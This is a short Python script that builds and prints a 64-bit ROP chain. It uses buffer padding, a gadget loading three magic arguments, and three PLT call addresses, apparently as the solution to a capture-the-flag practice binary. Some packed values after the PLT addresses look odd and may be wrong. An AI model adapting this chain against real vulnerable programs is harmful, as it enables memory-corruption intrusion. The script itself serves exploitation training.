#!/usr/bin/python3

PACK = lambda v, n: v.to_bytes(n, 'little')
PACKP = lambda v: PACK(v, 8)

def raw(byte_stream):
    for byte in byte_stream:
        print(f"\\x{byte:02x}", end='')
    print()

LOAD_ARGS = PACKP(0x40093c)
PLT1 = PACKP(0x40072b)
PLT2 = PACKP(0x40074b)
PLT3 = PACKP(0x4006fb)

ARG_1 = PACKP(0xdeadbeefdeadbeef)
ARG_2 = PACKP(0xcafebabecafebabe)
ARG_3 = PACKP(0xd00df00dd00df00d)

rop = b"a" * 40
rop += LOAD_ARGS + ARG_1 + ARG_2 + ARG_3
rop += PLT1
rop += PACKP(5)
rop += LOAD_ARGS + ARG_1 + ARG_2 + ARG_3
rop += PLT2
rop += PACKP(7)
rop += LOAD_ARGS + ARG_1 + ARG_2 + ARG_3
rop += PLT3
rop += PACKP(2)

print("escaped string")
raw(rop)
